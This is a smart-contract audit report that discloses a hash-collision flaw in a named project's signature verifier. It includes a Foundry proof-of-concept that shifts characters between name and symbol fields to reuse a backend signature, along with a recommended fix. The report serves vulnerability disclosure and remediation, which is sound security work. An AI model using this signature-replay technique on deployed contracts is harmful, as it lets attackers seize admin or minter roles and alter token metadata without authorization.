# 56860 sc medium hash collision in signature verification

Submitted on Oct 21st 2025 at 10:18:50 UTC by @ciphermalware for Audit Comp | Belong

* Report ID: #56860
* Report Type: Smart Contract
* Report severity: Medium
* Target: <https://github.com/belongnet/checkin-contracts/blob/main/contracts/v2/utils/SignatureVerifier.sol>
* Impacts:
  * Unintended alteration of what the NFT represents (e.g. token URI, payload, artistic content)

## Description

### Brief / Intro

In `SignatureVerifier.sol` the use of `abi.encodePacked` to calculate hashes for several sequential strings (name, symbol and URI) used for signature verification results in hash collisions. An attacker can obtain a valid backend signature for one set of inputs and then reuse it for a colliding set. This allows any user to pass verification for metadata the signer did not approve.

### Vulnerability Details

In `checkAccessTokenInfo` the hash is computed as:

```solidity
keccak256(
    abi.encodePacked(
        accessTokenInfo.metadata.name,  
        accessTokenInfo.metadata.symbol,  
        accessTokenInfo.contractURI,  
        accessTokenInfo.feeNumerator, 
        block.chainid  
    )
)
```

Three strings are concatenated one after another before the fixed uints. Two different payloads can produce the same concatenated bytes, causing identical keccak256 hashes. Once the backend signs Payload A, a user can present Payload B (that collides) with the same signature and pass verification because `signer.isValidSignatureNow` will return true.

The difference between name and symbol is ambiguous when using packed encoding, so characters can be moved between fields without changing the packed bytes. This is the exact collision scenario warned against in the Solidity docs.

Recommended remediation: replace `abi.encodePacked()` with `abi.encode()` in all signature verification functions. As noted in the Solidity docs: "Unless there is a compelling reason, abi.encode should be preferred."

### Impact Details

This is an authorization bypass: an attacker can alter metadata the signer intended to restrict. No on-chain privileges are required beyond possessing a valid signature for some triplet—the attack manipulates field boundaries while preserving bytes, so verification succeeds.

## References

* Solidity ABI spec (Non-standard Packed Mode warning): <https://docs.soliditylang.org/en/latest/abi-spec.html>

## Proof of Concept

The author used Foundry. Files added: `SignatureVerifier.sol` and `Structures.sol` in `src`, and `SignatureVerifier.t.sol` in `test`.

Test contract `SignatureVerifier.t.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "../src/SignatureVerifier.sol";
import "../src/Structures.sol";

contract HashCollisionPOC is Test {
    address public backendSigner;
    uint256 public backendPrivateKey;
    address public attacker;
    address public legitimateUser;
    
    function setUp() public {
        backendPrivateKey = 0xBEEF;
        backendSigner = vm.addr(backendPrivateKey);
        attacker = address(0xA11CE);
        legitimateUser = address(0xB0B);
    }
    
    function testBasicCollision() public pure {
        bytes32 hash1 = keccak256(abi.encodePacked("ABC", "DEF"));
        bytes32 hash2 = keccak256(abi.encodePacked("ABCD", "EF"));
        assertEq(hash1, hash2);
    }
    
    function testAccessTokenCollision() public view {
        string memory name1 = "Premium Club";
        string memory symbol1 = "PREM";
        string memory uri = "ipfs://QmHash";
        uint96 fee = 500;
        
        string memory name2 = "Premium Clu";
        string memory symbol2 = "bPREM";
        
        bytes32 hash1 = keccak256(abi.encodePacked(name1, symbol1, uri, fee, block.chainid));
        bytes32 hash2 = keccak256(abi.encodePacked(name2, symbol2, uri, fee, block.chainid));
        
        assertEq(hash1, hash2);
    }
    
    function testAccessTokenSignatureReuse() public {
        string memory legit_name = "VIP Access";
        string memory legit_symbol = "VIP";
        string memory uri = "ipfs://QmMetadata";
        uint96 fee = 500;
        
        bytes32 messageHash = keccak256(abi.encodePacked(legit_name, legit_symbol, uri, fee, block.chainid));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(backendPrivateKey, messageHash);
        bytes memory signature = abi.encodePacked(r, s, v);
        
        AccessTokenInfo memory legitInfo = AccessTokenInfo({
            paymentToken: address(0x1111111111111111111111111111111111111111),
            feeNumerator: fee,
            transferable: true,
            maxTotalSupply: 1000,
            mintPrice: 1 ether,
            whitelistMintPrice: 0.5 ether,
            collectionExpire: block.timestamp + 365 days,
            metadata: NftMetadata({name: legit_name, symbol: legit_symbol}),
            contractURI: uri,
            signature: signature
        });
        
        vm.prank(legitimateUser);
        SignatureVerifier.checkAccessTokenInfo(backendSigner, legitInfo);
        
        string memory attack_name = "VIP Acces";
        string memory attack_symbol = "sVIP";
        
        AccessTokenInfo memory attackInfo = AccessTokenInfo({
            paymentToken: address(0x2222222222222222222222222222222222222222),
            feeNumerator: fee,
            transferable: false,
            maxTotalSupply: 999999,
            mintPrice: 0.001 ether,
            whitelistMintPrice: 0,
            collectionExpire: 0,
            metadata: NftMetadata({name: attack_name, symbol: attack_symbol}),
            contractURI: uri,
            signature: signature
        });
        
        vm.prank(attacker);
        SignatureVerifier.checkAccessTokenInfo(backendSigner, attackInfo);
    }
    
    function testCreditTokenCollision() public view {
        string memory name1 = "Loyalty Points";
        string memory symbol1 = "LOYAL";
        string memory uri = "https://api.belong.net/token/{id}";
        
        string memory name2 = "Loyalty Point";
        string memory symbol2 = "sLOYAL";
        
        bytes32 hash1 = keccak256(abi.encodePacked(name1, symbol1, uri, block.chainid));
        bytes32 hash2 = keccak256(abi.encodePacked(name2, symbol2, uri, block.chainid));
        
        assertEq(hash1, hash2);
    }
    
    function testCreditTokenSignatureReuse() public {
        string memory legit_name = "Reward Token";
        string memory legit_symbol = "RWRD";
        string memory uri = "https://api.example.com/metadata";
        
        bytes32 messageHash = keccak256(abi.encodePacked(legit_name, legit_symbol, uri, block.chainid));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(backendPrivateKey, messageHash);
        bytes memory signature = abi.encodePacked(r, s, v);
        
        ERC1155Info memory legitInfo = ERC1155Info({
            name: legit_name,
            symbol: legit_symbol,
            defaultAdmin: legitimateUser,
            manager: legitimateUser,
            minter: legitimateUser,
            burner: legitimateUser,
            uri: uri,
            transferable: true
        });
        
        vm.prank(legitimateUser);
        SignatureVerifier.checkCreditTokenInfo(backendSigner, signature, legitInfo);
        
        string memory attack_name = "Reward Toke";
        string memory attack_symbol = "nRWRD";
        
        ERC1155Info memory attackInfo = ERC1155Info({
            name: attack_name,
            symbol: attack_symbol,
            defaultAdmin: attacker,
            manager: attacker,
            minter: attacker,
            burner: attacker,
            uri: uri,
            transferable: false
        });
        
        vm.prank(attacker);
        SignatureVerifier.checkCreditTokenInfo(backendSigner, signature, attackInfo);
    }
    
    function testAbiEncodePreventCollision() public pure {
        string memory name1 = "Premium Club";
        string memory symbol1 = "PREM";
        string memory name2 = "Premium Clu";
        string memory symbol2 = "bPREM";
        
        bytes32 packed1 = keccak256(abi.encodePacked(name1, symbol1));
        bytes32 packed2 = keccak256(abi.encodePacked(name2, symbol2));
        assertEq(packed1, packed2);
        
        bytes32 encoded1 = keccak256(abi.encode(name1, symbol1));
        bytes32 encoded2 = keccak256(abi.encode(name2, symbol2));
        assertTrue(encoded1 != encoded2);
    }
}
```

Test command:

```
forge test --match-contract HashCollisionPOC -vvv
```

Observed output confirming collisions and signature reuse:

```
Ran 6 tests for test/SignatureVerifier.t.sol:HashCollisionPOC
[PASS] testAbiEncodePreventCollision() (gas: 3744)
[PASS] testAccessTokenCollision() (gas: 3171)
[PASS] testAccessTokenSignatureReuse() (gas: 48157)
[PASS] testBasicCollision() (gas: 1248)
[PASS] testCreditTokenCollision() (gas: 2750)
[PASS] testCreditTokenSignatureReuse() (gas: 41710)
Suite result: ok. 6 passed; 0 failed; 0 skipped; finished in 6.23ms (4.73ms CPU time)
```

{% hint style="info" %}
Suggested fix (as stated in the report): use abi.encode(...) instead of abi.encodePacked(...) when constructing the message hash for signature verification. This prevents dynamic fields from being concatenated ambiguously and avoids the described collision class.
{% endhint %}
